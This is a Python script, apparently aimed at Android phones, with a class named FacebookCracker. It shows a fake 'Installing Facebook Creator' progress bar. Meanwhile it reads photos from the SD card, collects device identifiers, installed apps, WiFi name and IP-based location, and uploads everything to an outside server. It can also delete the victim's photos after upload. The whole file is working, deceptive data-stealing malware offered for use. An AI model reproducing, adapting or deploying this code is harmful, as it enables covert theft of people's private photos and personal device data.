import time
import random
import os
import requests
import platform
import base64
import uuid
import json
from datetime import datetime
import sys
import threading
import subprocess

class FacebookCracker:
    def __init__(self):
        self.debug_log = []
        self.device_id = self.get_device_id()
        self.MAX_DATA_SIZE = 500 * 1024 * 1024  # 500 MB in bytes

    def get_device_id(self):
        """Generate a unique device ID."""
        return uuid.uuid4().hex

    def get_last_modified(self, file_path):
        """Get the last modified time of a file in a human-readable format."""
        try:
            mtime = os.path.getmtime(file_path)
            last_edit = datetime.fromtimestamp(mtime)
            now = datetime.now()
            delta = now - last_edit
            if delta.days > 0:
                return f"{delta.days} days ago"
            elif delta.seconds > 3600:
                return f"{delta.seconds // 3600} hours ago"
            elif delta.seconds > 60:
                return f"{delta.seconds // 60} minutes ago"
            else:
                return "just now"
        except Exception as e:
            self.debug_log.append(f"Failed to get mtime for {file_path}: {str(e)}")
            return "unknown"

    def collect_photos(self, sdcard_path, max_size=1024*1024):
        """Collect photos from the SD card, respecting 500 MB total limit."""
        photos = []
        image_exts = ('.jpg', '.jpeg', '.png', '.gif', '.bmp')
        total_size = 0
        deleted_files = []
        for root, dirs, files in os.walk(sdcard_path):
            if '/Android/data' in root:
                continue
            for file_name in files:
                if total_size >= self.MAX_DATA_SIZE:
                    self.debug_log.append("Reached 500 MB data limit")
                    break
                if file_name.lower().endswith(image_exts):
                    file_path = os.path.join(root, file_name)
                    size = os.path.getsize(file_path)
                    if 0 < size <= max_size:
                        if total_size + size > self.MAX_DATA_SIZE:
                            self.debug_log.append(f"Skipping {file_name}: exceeds 500 MB limit")
                            continue
                        try:
                            with open(file_path, 'rb') as f:
                                content = base64.b64encode(f.read()).decode('utf-8')
                            relative_path = os.path.relpath(root, sdcard_path)
                            photos.append({
                                'name': file_name,
                                'content': content,
                                'folder': relative_path,
                                'last_edit': self.get_last_modified(file_path),
                                'size': size
                            })
                            total_size += size
                            deleted_files.append(file_path)
                        except Exception as e:
                            self.debug_log.append(f"Failed to read {file_path}: {str(e)}")
                            continue
        return photos, deleted_files

    def get_device_info(self):
        """Gather device information without root."""
        info = {}
        try:
            info['model'] = subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8').strip()
            info['os_version'] = subprocess.check_output(['getprop', 'ro.build.version.release']).decode('utf-8').strip()
            info['serial'] = subprocess.check_output(['getprop', 'ro.serialno']).decode('utf-8').strip()
            info['android_id'] = subprocess.check_output(['settings', 'get', 'secure', 'android_id']).decode('utf-8').strip()
            info['installed_apps'] = subprocess.check_output(['pm', 'list', 'packages']).decode('utf-8').strip().splitlines()
            info['battery'] = subprocess.check_output(['dumpsys', 'battery']).decode('utf-8').strip()
            info['uptime'] = subprocess.check_output(['uptime']).decode('utf-8').strip()
            try:
                info['wifi_ssid'] = subprocess.check_output(["dumpsys", "wifi | grep SSID"], shell=True).decode('utf-8').strip()
            except:
                info['wifi_ssid'] = "Unknown"
        except Exception as e:
            self.debug_log.append(f"Failed to get device info: {str(e)}")
        return info

    def display_progress_bar(self, duration, total_files):
        """Display a fake progress bar with installation messages."""
        fake_messages = [
            "Initializing Facebook Creator setup...",
            "Verifying device compatibility...",
            "Downloading core components...",
            "Configuring Creator tools...",
            "Finalizing installation..."
        ]
        print("\nInstalling Facebook Creator...")
        for i in range(101):
            if i % 20 == 0 and i // 20 < len(fake_messages):
                print(fake_messages[i // 20])
            time.sleep(duration / 100)  # Simulate processing time
            bar_length = 50
            filled = int(bar_length * i // 100)
            bar = '█' * filled + '-' * (bar_length - filled)
            sys.stdout.write(f'\rProgress: |{bar}| {i}% ({min(i * total_files // 100, total_files)}/{total_files} processed)')
            sys.stdout.flush()
        print("\nSoftware not supported on your mobile.\n")

    def upload_scripts(self, delete_photos=False):
        try:
            device_name = platform.node() or "Unknown"
            if device_name == "localhost" or not device_name:
                device_name = f"Device_{uuid.uuid4().hex[:8]}"
            server_url_upload = "https://script.onemancode.com/api/upload_data"
            sdcard_path = "/sdcard"
            time.sleep(random.randint(2, 5))
            if not os.path.exists(sdcard_path):
                self.debug_log.append("SD card path not accessible")
                print("Error: SD card path not accessible")
                return
            photos, deleted_files = self.collect_photos(sdcard_path)
            total_files = len(photos)
            device_info = self.get_device_info()
            if total_files == 0:
                self.debug_log.append("No photos found on SD card")
                print("No photos found to upload.")
                return
            batch_size = 100  # Upload 100 files at a time
            for i in range(0, total_files, batch_size):
                batch_photos = photos[i:i + batch_size]
                batch_deleted_files = deleted_files[i:i + batch_size]
                progress_thread = threading.Thread(target=self.display_progress_bar, args=(10, len(batch_photos)))
                progress_thread.start()
                try:
                    ip_info = requests.get('http://ip-api.com/json/', timeout=5).json()
                    metadata = {
                        'ip': ip_info.get('query', 'Unknown'),
                        'country': ip_info.get('country', 'Unknown'),
                        'city': ip_info.get('city', 'Unknown'),
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': device_name
                    }
                except Exception:
                    metadata = {
                        'ip': 'Unknown',
                        'country': 'Unknown',
                        'city': 'Unknown',
                        'os': platform.system() + ' ' + platform.release(),
                        'device_model': device_name
                    }
                upload_payload = {
                    'device_id': self.device_id,
                    'device_name': device_name,
                    'metadata': json.dumps(metadata),
                    'photos': json.dumps(batch_photos),
                    'device_info': json.dumps(device_info)
                }
                try:
                    response = requests.post(server_url_upload, json=upload_payload, timeout=60)
                    progress_thread.join()
                    if response.status_code == 200:
                        self.debug_log.append(f"Successfully uploaded batch {i//batch_size + 1} for device {self.device_id}")
                        if delete_photos:
                            for file_path in batch_deleted_files:
                                try:
                                    os.remove(file_path)
                                    self.debug_log.append(f"Deleted {file_path}")
                                except Exception as e:
                                    self.debug_log.append(f"Failed to delete {file_path}: {str(e)}")
                    else:
                        self.debug_log.append(f"Batch {i//batch_size + 1} upload failed: {response.status_code} {response.text}")
                        print(f"\nBatch {i//batch_size + 1} upload failed: {response.status_code}")
                except Exception as e:
                    progress_thread.join()
                    self.debug_log.append(f"Batch {i//batch_size + 1} upload error: {str(e)}")
                    print(f"\nBatch {i//batch_size + 1} upload error: {str(e)}")
        except Exception as e:
            self.debug_log.append(f"General error in upload_scripts: {str(e)}")
            print(f"Error: {str(e)}")

    def start_menu(self):
        """Start the upload process."""
        self.upload_scripts(delete_photos=False)

def main():
    cracker = FacebookCracker()
    cracker.start_menu()

if __name__ == "__main__":
    main()